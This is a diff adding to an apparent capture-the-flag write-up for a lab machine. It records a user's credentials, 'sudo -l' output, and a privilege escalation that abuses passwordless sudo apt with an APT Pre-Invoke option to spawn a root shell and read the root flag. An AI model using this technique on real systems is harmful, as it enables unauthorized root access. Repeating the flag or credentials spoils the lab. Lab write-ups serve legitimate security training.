@@ -278,4 +278,33 @@ My SSH login
 
 ## cobra / mz4%o7BGum#TTu
 
+cobra@thm-lamp:~$ sudo -l
+Matching Defaults entries for cobra on thm-lamp:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User cobra may run the following commands on thm-lamp:
+    (ALL) NOPASSWD: /usr/bin/apt
+
+
+## Get Root
+cobra@thm-lamp:/tmp$ sudo -l
+Matching Defaults entries for cobra on thm-lamp:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User cobra may run the following commands on thm-lamp:
+    (ALL) NOPASSWD: /usr/bin/apt
+cobra@thm-lamp:/tmp$ sudo /usr/bin/apt update -o APT::Update::Pre-Invoke::=/bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd ..
+# cd root
+# ls
+root.txt  snap
+# cat root.txt
+THM{7b88ac4f52cd8723a8d0c632c2d930ba}
+# 
+
+
+
+
 </code>
